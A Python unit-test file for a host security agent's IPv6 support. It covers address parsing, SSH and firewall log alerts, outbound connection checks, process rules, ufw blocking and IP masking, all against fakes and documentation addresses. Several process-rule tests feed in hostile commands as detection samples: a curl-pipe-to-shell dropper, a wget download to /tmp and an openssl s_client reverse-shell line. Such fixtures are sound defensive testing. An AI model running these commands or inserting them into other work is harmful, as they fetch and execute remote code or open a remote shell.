#!/usr/bin/env python3
"""IPv6 everywhere an address is read (2026-11-18): the shared reader, the SSH and firewall log agents, outbound connections,
process rules, the direct checks, blocking (target parsing and ufw rule order) and masking on Linux and Windows.

Only documentation addresses (2001:db8::/32, 203.0.113.x, 198.51.100.x) and made-up local ones (fd12:3456:789a::/48, fe80::)
appear here. Nothing reaches a real firewall, log or network: every reader and `ufw` call is a fake.
Run:  swarmsentinel-env/bin/python3 backend/tools/test_ipv6.py"""
import os
import sys
import tempfile
import types
import unittest
from datetime import datetime, timezone
from unittest import mock

os.environ.setdefault('SSAI_AGENT_HOME', tempfile.mkdtemp(prefix='ssai-ipv6-'))
HERE = os.path.dirname(os.path.abspath(__file__))
BACKEND = os.path.dirname(HERE)
sys.path[:0] = [os.path.join(BACKEND, 'agents'), BACKEND, os.path.join(os.path.dirname(BACKEND), 'windows_agent')]
import agent_runner as R  # noqa: E402
import agent_util as U  # noqa: E402
import live_checks as L  # noqa: E402
import remediation as REM  # noqa: E402
from ssai_agent import util as WIN  # noqa: E402

A6, B6, C6 = '2001:db8::5', '2001:db8:0:1::7', '2001:db8:ffff::9'       # attackers (documentation range)
LOCAL6 = 'fd12:3456:789a::5'                                            # a device inside the network (unique-local)
NOW = datetime(2026, 11, 18, 12, 0, 0, tzinfo=timezone.utc)


# ── the shared reader ────────────────────────────────────────────────────────

class Reader(unittest.TestCase):
    def test_finds_v4_v6_bracketed_zoned_and_mapped_addresses(self):
        got = U.find_ips(f'SRC={A6} DST={LOCAL6} [{B6}]:443 203.0.113.4:22 fe80::1%eth0 ::ffff:198.51.100.3 end {C6}.')
        self.assertEqual(got, [(A6, None), (LOCAL6, None), (B6, 443), ('203.0.113.4', 22), ('fe80::1', None),
                               ('198.51.100.3', None), (C6, None)])

    def test_times_macs_versions_and_the_unspecified_address_are_not_addresses(self):
        self.assertEqual(U.find_ips('Nov 18 00:01:23 MAC=aa:bb:cc:dd:ee:ff:00:11:22:33:44:55 v1.2.3.4 build 10:20 :: 0.0.0.0'), [])

    def test_normalise(self):
        self.assertEqual(U.normalise_ip('2001:DB8:0:0::5'), A6)
        self.assertEqual(U.normalise_ip('[2001:db8::5]'), A6)
        self.assertEqual(U.normalise_ip('::ffff:203.0.113.5'), '203.0.113.5')
        self.assertIsNone(U.normalise_ip('::'))
        self.assertIsNone(U.normalise_ip('junk'))

    def test_ssh_source_takes_sshds_own_from_port_not_a_crafted_user_name(self):
        line = f'sshd[1]: Failed password for invalid user x from 198.51.100.1 port 1 from {A6} port 4242 ssh2'
        self.assertEqual(U.ssh_source(line), A6)
        self.assertEqual(U.ssh_source(f'sshd[1]: Invalid user from from {A6} port 22'), A6)
        self.assertEqual(U.ssh_source('sshd[1]: Failed password for root from ::ffff:203.0.113.5 port 1 ssh2'), '203.0.113.5')
        self.assertIsNone(U.ssh_source('sshd[1]: Server listening on :: port 22.'))

    def test_split_host_port_for_ss_columns(self):
        self.assertEqual(U.split_host_port(f'[{A6}]:443'), (A6, 443))
        self.assertEqual(U.split_host_port(f'{A6}:443'), (A6, 443))                 # older ss without brackets
        self.assertEqual(U.split_host_port('203.0.113.5:80'), ('203.0.113.5', 80))
        self.assertEqual(U.split_host_port('*:22'), ('*', 22))
        self.assertEqual(U.split_host_port('garbage'), (None, None))

    def test_inside_the_network_covers_ipv6_local_ranges(self):
        for ip in (LOCAL6, 'fe80::1', '::1', '::ffff:10.0.0.1', '100.100.1.1', '169.254.3.4', '10.1.2.3'):
            self.assertTrue(U._is_private_ip(ip), ip)
        for ip in (A6, '203.0.113.1', 'junk', None):
            self.assertFalse(U._is_private_ip(ip), ip)


class Masking(unittest.TestCase):
    TEXT = f'from {LOCAL6} and fe80::1%eth0 and {A6} and ::1 and ::ffff:192.168.1.5 and 10.1.2.3 and 203.0.113.9 at 12:34:56'
    WANT = ('from fd12:3456:xxxx:: and fe80:0:xxxx:: and 2001:db8::5 and ::1 and ::ffff:192.168.xxx.xxx and 10.1.xxx.xxx '
            'and 203.0.113.9 at 12:34:56')

    def test_linux_agents_mask_local_ipv6_and_keep_public_readable(self):
        self.assertEqual(U.mask_private_ip(self.TEXT), self.WANT)

    def test_windows_agent_masks_the_same_way(self):
        self.assertEqual(WIN.mask_private_ips(self.TEXT), self.WANT)
        self.assertFalse(WIN.is_private_address(A6))        # documentation range is not anyone's home network
        self.assertTrue(WIN.is_private_address(LOCAL6))

    def test_a_masked_ipv6_address_is_never_blocked(self):
        with self.assertRaisesRegex(REM.TargetError, 'masked'):
            REM.classify_target('fd12:3456:xxxx::')


# ── SSH log ──────────────────────────────────────────────────────────────────

def ssh_agent():
    a = R.AuthLogAgent.__new__(R.AuthLogAgent)
    a._seen, a._fail_times, a._bf_success = R._BoundedSet(1000), R._BoundedDict(1000), R._BoundedSet(1000)
    a._recent_fails, a._last_spread_alert, a.sent = R.deque(maxlen=a.SPREAD_KEEP), float('-inf'), []
    a._submit = lambda **k: a.sent.append(k)
    return a


def fail(a, ip, t, user='root'):
    a.handle_line(f'Nov 18 10:00:00 hub sshd[1]: Failed password for {user} from {ip} port 50000 ssh2', now=t)


class SshLog(unittest.TestCase):
    def test_each_ipv6_attacker_is_counted_on_its_own(self):
        a = ssh_agent()
        for i in range(4):
            fail(a, A6, 1000 + i)
            fail(a, B6, 1000 + i)
        self.assertEqual(a.sent, [])                                  # 4 each: no alarm (they used to be ONE "unknown" with 8)
        self.assertNotIn('unknown', a._fail_times)
        fail(a, A6, 1010)
        self.assertEqual([(s['threat_type'], s['url']) for s in a.sent], [('brute-force', A6)])

    def test_login_after_ipv6_failures_is_critical(self):
        a = ssh_agent()
        for i in range(5):
            fail(a, A6, 1000 + i)
        a.handle_line(f'Nov 18 10:00:00 hub sshd[1]: Accepted password for root from {A6} port 50001 ssh2', now=1010)
        crit = [s for s in a.sent if s['threat_type'] == 'brute-force-success']
        self.assertEqual(len(crit), 1)
        self.assertEqual(crit[0]['url'], A6)

    def test_ipv4_mapped_counts_as_the_ipv4_address(self):
        a = ssh_agent()
        for i in range(3):
            fail(a, '::ffff:203.0.113.7', 1000 + i)
        for i in range(2):
            fail(a, '203.0.113.7', 1010 + i)
        self.assertEqual([s['url'] for s in a.sent], ['203.0.113.7'])

    def test_unknown_user_attempt_counts_twice_on_purpose(self):
        # Owner decision 2026-11-16: sshd logs "Invalid user" AND "Failed password" for one guess at a name that does not
        # exist; both count, so guessing non-existent accounts reaches the alarm sooner. Do not "fix" this.
        a = ssh_agent()
        a.handle_line(f'Nov 18 10:00:00 hub sshd[1]: Invalid user nosuch from {A6} port 50000', now=1000)
        a.handle_line(f'Nov 18 10:00:00 hub sshd[1]: Failed password for invalid user nosuch from {A6} port 50000 ssh2', now=1000)
        self.assertEqual(a._recent_failures(A6, 1000), 2)

    def test_ipv6_loopback_login_is_not_reported(self):
        a = ssh_agent()
        a.handle_line('Nov 18 10:00:00 hub sshd[1]: Accepted publickey for root from ::1 port 50000 ssh2: ED25519 SHA256:x', now=1)
        self.assertEqual(a.sent, [])


# ── firewall log (syslog) ────────────────────────────────────────────────────

def syslog_agent():
    a = R.SyslogAgent.__new__(R.SyslogAgent)
    a.sent = []
    a._submit = lambda **k: a.sent.append(k)
    return a


class FirewallLog(unittest.TestCase):
    def test_inbound_ipv6_block_to_this_hosts_public_address_is_reported(self):
        a = syslog_agent()
        a.handle_line(f'Nov 18 10:00:00 hub kernel: [UFW BLOCK] IN=eth0 OUT= MAC=aa:bb SRC={A6} DST={C6} LEN=80 PROTO=TCP DPT=22')
        self.assertEqual([(s['threat_type'], s['url']) for s in a.sent], [('firewall-block', A6)])

    def test_outbound_ipv6_egress_block_is_not_threat_intel(self):
        a = syslog_agent()
        a.handle_line(f'Nov 18 10:00:00 hub kernel: [UFW BLOCK] IN= OUT=eth0 SRC={C6} DST={A6} LEN=80 PROTO=TCP DPT=443')
        self.assertEqual(a.sent, [])

    def test_local_ipv6_source_is_not_reported(self):
        a = syslog_agent()
        a.handle_line(f'Nov 18 10:00:00 hub kernel: [UFW BLOCK] IN=eth0 OUT= SRC={LOCAL6} DST={C6} PROTO=UDP DPT=5353')
        self.assertEqual(a.sent, [])

    def test_ipv4_inbound_to_a_lan_address_still_works(self):
        a = syslog_agent()
        a.handle_line('Nov 18 10:00:00 hub kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.8 DST=10.0.0.5 PROTO=TCP DPT=23')
        self.assertEqual([s['url'] for s in a.sent], ['203.0.113.8'])


# ── outbound connections ─────────────────────────────────────────────────────

class Connections(unittest.TestCase):
    SS = ('Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'
          f'0 0 [{C6}]:51000 [{A6}]:4444 users:(("sh",pid=900,fd=4))\n'
          f'0 0 [{C6}]:51001 [{LOCAL6}]:4444 users:(("sh",pid=901,fd=4))\n'
          f'0 0 [::ffff:10.0.0.4]:51002 [::ffff:203.0.113.9]:31337 users:(("x",pid=902,fd=4))\n')

    def test_ipv6_peers_are_checked_against_c2_ports_and_feeds(self):
        a = R.SocketWatchAgent.__new__(R.SocketWatchAgent)
        a._seen, a._intel_seen, a.sent = R._BoundedSet(100), R._BoundedDict(100), []
        a._submit = lambda **k: a.sent.append(k)
        a.log = mock.Mock()
        asked = []
        store = types.SimpleNamespace(match_ip=lambda ip, port=None: asked.append((ip, port)))
        with mock.patch.object(R.subprocess, 'run', return_value=types.SimpleNamespace(stdout=self.SS, returncode=0)), \
                mock.patch.object(R.intel, 'STORE', store):
            a._scan_connections()
        self.assertEqual(asked, [(A6, 4444), ('203.0.113.9', 31337)])           # the LAN peer is skipped
        self.assertEqual([s['url'] for s in a.sent], [f'[{A6}]:4444', '203.0.113.9:31337'])
        self.assertEqual(REM.classify_target(a.sent[0]['url']), {'kind': 'ip', 'value': A6})


# ── process rules ────────────────────────────────────────────────────────────

class ProcessRules(unittest.TestCase):
    def test_dropper_from_a_bare_ipv6_address(self):
        self.assertEqual(R.ProcessMonitorAgent.classify(f'curl -s http://[{A6}]:8080/x.sh | sh'), 'ip-dropper')
        self.assertEqual(R.ProcessMonitorAgent.classify(f'wget http://[{A6}]/m -O /tmp/m'), 'ip-dropper')

    def test_loopback_ipv6_download_is_not_a_dropper(self):
        self.assertIsNone(R.ProcessMonitorAgent.classify('curl -s http://[::1]:8080/x.sh | sh'))

    def test_openssl_shell_to_an_ipv6_address(self):
        self.assertEqual(R.ProcessMonitorAgent.classify(f'openssl s_client -quiet -connect [{A6}]:443'), 'openssl-shell')


# ── direct checks ────────────────────────────────────────────────────────────

class FakeStore:
    def __init__(self, ips=()):
        self.ips = set(ips)

    def stats(self):
        return {'entries': len(self.ips)}

    def match_ip(self, ip, port=None):
        return {'value': ip, 'source': 'feodo'} if ip in self.ips else None

    def match_domain(self, domain):
        return None


AUTH6 = (f'2026-11-18T10:00:00+00:00 hub sshd[1]: Failed password for root from {A6} port 1 ssh2\n' * 6
         + f'2026-11-18T10:05:00+00:00 hub sshd[1]: Accepted password for root from {A6} port 1 ssh2\n'
         + f'2026-11-18T10:00:00+00:00 hub sshd[1]: Failed password for root from {A6}0 port 1 ssh2\n')   # 2001:db8::50


def check(threat, **kw):
    kw.setdefault('read_cmdline', lambda pid: None)
    kw.setdefault('ss', lambda args: '')
    kw.setdefault('read_tail', lambda path, size: AUTH6)
    kw.setdefault('store', FakeStore())
    kw.setdefault('now', NOW)
    return L.check(dict({'detected_by': 'X'}, **threat), **kw)


class DirectChecks(unittest.TestCase):
    def test_ipv6_connection_open(self):
        ss = ('Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n'
              f'0 0 [{C6}]:51000 [{A6}]:4444 users:(("sh",pid=900,fd=4))\n')
        r = check({'type': 'c2-beacon', 'url': f'[{A6}]:4444'}, ss=lambda args: ss)
        self.assertEqual(r['result'], L.CONFIRMED, r)
        r = check({'type': 'c2-beacon', 'url': f'[{A6}]:5555'}, ss=lambda args: ss)
        self.assertEqual(r['result'], L.NOT_CONFIRMED)

    def test_ipv6_failed_logins_are_counted_exactly(self):
        self.assertEqual(L.failed_login_count(A6, lambda p, s: AUTH6, NOW), 6)    # 2001:db8::50 is another address
        self.assertEqual(check({'type': 'brute-force', 'url': A6})['result'], L.CONFIRMED)

    def test_ipv6_login_after_failures(self):
        self.assertEqual(check({'type': 'brute-force-success', 'url': A6})['result'], L.CONFIRMED)

    def test_ipv6_feed_listing(self):
        self.assertEqual(check({'type': 'intel-match', 'url': A6}, store=FakeStore([A6]))['result'], L.CONFIRMED)


# ── blocking ─────────────────────────────────────────────────────────────────

class Targets(unittest.TestCase):
    def test_ipv6_target_shapes(self):
        for raw in (A6, f'[{A6}]:4444', f'http://[{A6}]:8080/x.sh', '2001:DB8:0::5', f'{A6}%eth0'):
            self.assertEqual(REM.classify_target(raw), {'kind': 'ip', 'value': A6}, raw)

    def test_unblockable_ipv6(self):
        for raw in ('::1', '[::1]:22', 'fe80::1', '::', 'ff02::1'):
            with self.assertRaises(REM.TargetError, msg=raw):
                REM.classify_target(raw)


class FakeUfw:
    """`ufw status numbered` lists `rules`; insert/append calls are recorded. Never runs the real ufw."""

    def __init__(self, rules):
        self.rules, self.calls = list(rules), []

    def __call__(self, cmd, **kw):
        args = cmd[next(i for i, x in enumerate(cmd) if x.endswith('ufw')) + 1:]
        self.calls.append(args)
        if args == ['status']:
            return types.SimpleNamespace(returncode=0, stdout='Status: active\n', stderr='')
        if args == ['status', 'numbered']:
            body = ''.join(f'[{i:2}] {r}\n' for i, r in enumerate(self.rules, 1))
            return types.SimpleNamespace(returncode=0, stdout='Status: active\n\n     To  Action  From\n' + body, stderr='')
        if args[0] == 'insert':
            pos, rule = int(args[1]), ' '.join(args[2:])
            if (pos <= len(self.rules) and '(v6)' in self.rules[pos - 1]) != (':' in rule):
                return types.SimpleNamespace(returncode=1, stdout='', stderr=f"ERROR: Invalid position '{pos}'")
            self.rules.insert(pos - 1, rule + (' (v6)' if ':' in rule else ''))
        else:
            self.rules.append(' '.join(args) + (' (v6)' if ':' in ' '.join(args) else ''))
        return types.SimpleNamespace(returncode=0, stdout='Rule inserted', stderr='')


class Firewall(unittest.TestCase):
    RULES = ['22/tcp ALLOW IN Anywhere', '5000/tcp ALLOW IN Anywhere',
             '22/tcp (v6) ALLOW IN Anywhere (v6)', '5000/tcp (v6) ALLOW IN Anywhere (v6)']

    def test_ipv6_deny_goes_above_the_ipv6_allow_rules(self):
        u = FakeUfw(self.RULES)
        REM.firewall_block(A6, u)
        v6 = [r for r in u.rules if '(v6)' in r]
        self.assertTrue(v6[0].startswith('deny out to ' + A6) or v6[0].startswith('deny from ' + A6), v6)
        self.assertTrue(all(r.startswith('deny') for r in v6[:2]), v6)              # both denies before any v6 allow
        self.assertTrue(v6[2].startswith('22/tcp'), v6)
        self.assertIn(['insert', '3', 'deny', 'from', A6], u.calls)

    def test_ipv6_with_no_ipv6_rules_yet_is_appended(self):
        u = FakeUfw(self.RULES[:2])
        REM.firewall_block(A6, u)
        self.assertIn(['deny', 'from', A6], u.calls)                  # the first IPv6 rule: appended (nothing to go above)
        self.assertEqual(sorted(r.split(' 2001')[0] for r in u.rules if '(v6)' in r), ['deny from', 'deny out to'])

    def test_ipv4_is_unchanged(self):
        u = FakeUfw(self.RULES)
        REM.firewall_block('203.0.113.7', u)
        self.assertEqual(u.calls, [['status'], ['insert', '1', 'deny', 'from', '203.0.113.7'],
                                   ['insert', '1', 'deny', 'out', 'to', '203.0.113.7']])

    def test_ipv6_switched_off_in_ufw_says_how_to_fix_it(self):
        def run(cmd, **kw):
            args = cmd[next(i for i, x in enumerate(cmd) if x.endswith('ufw')) + 1:]
            if args == ['status']:
                return types.SimpleNamespace(returncode=0, stdout='Status: active\n', stderr='')
            if args == ['status', 'numbered']:
                return types.SimpleNamespace(returncode=0, stdout='Status: active\n', stderr='')
            return types.SimpleNamespace(returncode=1, stdout='', stderr='ERROR: IPv6 support not enabled')
        with self.assertRaisesRegex(REM.RemediationError, 'IPV6=yes'):
            REM.firewall_block(A6, run)


if __name__ == '__main__':
    unittest.main()
